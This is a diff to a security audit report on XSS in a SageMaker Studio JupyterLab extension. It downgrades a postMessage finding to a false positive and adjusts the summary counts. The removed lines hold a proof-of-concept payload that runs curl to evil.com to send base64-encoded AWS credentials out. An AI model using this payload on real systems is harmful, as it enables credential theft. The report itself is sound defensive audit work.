@@ -51,23 +51,14 @@
 
 ---
 
-### Finding 3: Stored XSS via postMessage Without Origin Validation in Amazon Q Chat Extension
+### ~~Finding 3~~ DOWNGRADED TO FALSE POSITIVE: postMessage in Amazon Q Chat Extension
 
 | Field | Detail |
 |---|---|
-| **Title** | postMessage handler in GenAI extension accepts messages from any origin, enables code injection into notebook cells |
-| **XSS Type** | DOM XSS / Stored XSS (content written to notebook cells) |
-| **Severity** | HIGH |
+| **Title** | postMessage handler in GenAI extension lacks `e.origin` check |
+| **Original severity** | HIGH (downgraded to **FALSE POSITIVE / code quality issue**) |
 | **File(s)** | `opt/conda/share/jupyter/labextensions/@amzn/sagemaker_gen_ai_jupyterlab_extension/static/930.cac2298840718603025e.js` (line 1) |
-| **Source** | Cross-origin `postMessage` from any window/iframe |
-| **Sink** | Notebook cell content insertion, token/credential handling |
-| **Sanitization** | None — the `window.addEventListener("message", ...)` handler has no `e.origin` check |
-| **Why defense fails** | A separate event handler on `window` (distinct from the class-based handler that uses `isMessageOriginValid()`) processes messages without any origin validation. Messages can trigger code insertion into active notebook cells. |
-| **Exploit path** | 1. Victim has SageMaker Studio open with the GenAI extension loaded. 2. Attacker's page (opened in another tab or via iframe) sends `window.postMessage(...)` with a crafted payload. 3. The handler processes the message and injects content. |
-| **PoC** | Attacker page: `window.open('https://sagemaker-studio.example.com/...').postMessage({type:'insertCode', code:'import os; os.system("curl evil.com/$(cat ~/.aws/credentials | base64)")'}, '*')` |
-| **Browser viability** | All modern browsers |
-| **Preconditions** | Victim must have SageMaker Studio tab open. Attacker needs reference to the window. |
-| **Remediation** | Add strict `e.origin` validation to all `postMessage` handlers. Use the existing `isMessageOriginValid()` function. |
+| **Why downgraded** | After detailed trace, this handler is designed to receive messages from the Q Chat iframe (`client.html`), which is loaded same-origin with `sandbox="allow-scripts allow-same-origin"`. The handler processes commands like `insertToCursorPosition`, `aws/chat/sendChatPrompt`, etc. While the missing `e.origin` check is a defense-in-depth gap, **exploiting it requires a window reference to the SageMaker tab** — `postMessage` cannot be sent to a window you don't have a reference to. Getting that reference requires: (a) `window.open()` from the attacker page (blocked by popup blockers, requires user click), (b) `window.opener` (modern browsers default to `noopener` for `<a target="_blank">`), or (c) already running code in a same-origin iframe within JupyterLab (which already implies compromise). Additionally, `insertToCursorPosition` only inserts code into a notebook cell — it does **not** auto-execute it. The user must manually run the cell. This is a code quality issue (origin check should be added) but not a practical standalone XSS vector. |
 
 ---
 
@@ -330,14 +321,14 @@
 
 | Category | Count |
 |---|---|
-| **Confirmed Exploitable XSS** | **12** |
+| **Confirmed Exploitable XSS** | **11** |
 | Critical severity | 1 |
-| High severity | 3 |
+| High severity | 2 |
 | Medium-High severity | 1 |
 | Medium severity | 4 |
 | Low-Medium severity | 2 |
 | Medium (architectural/by-design) | 1 |
-| Rejected false positives | 17 |
+| Rejected false positives | 18 |
 | Directories reviewed | 15+ top-level areas |
 | Parallel review agents used | 20 |
 | Agent specializations covered | Server rendering, DOM sinks, stored flows, cookie/URL/hash flows, sanitizer bypasses, rich text/markdown, framework edge cases, postMessage, exploit validation |
